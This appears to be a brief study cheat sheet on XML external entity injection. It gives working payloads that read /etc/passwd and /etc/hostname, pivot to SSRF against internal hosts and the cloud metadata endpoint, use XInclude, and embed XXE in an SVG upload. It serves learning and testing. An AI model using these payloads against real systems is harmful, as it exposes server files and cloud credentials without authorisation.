# XML external entity injection
## File read
To exploit XXE we need to:
* Create or change DOCTYPE that defines external entity
* Edit a data which is returned back in app's response in order to use defined entity
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```
Change it to:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
We define external entity `xxe` which contains /etc/passwd file and then pass this entity into application response  

## XXE to SSRF
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
We can try to access EC@ metadata endpoint with this attack (http://169.254.169.254/latest/meta-data/)

## Blind XXE
We can use XInclude when we don't contol entire XML document and can't create or modify DOCTYPE entity
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## XXE via file upload
We can upload malicious SVG or DOC file containing XXE.
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```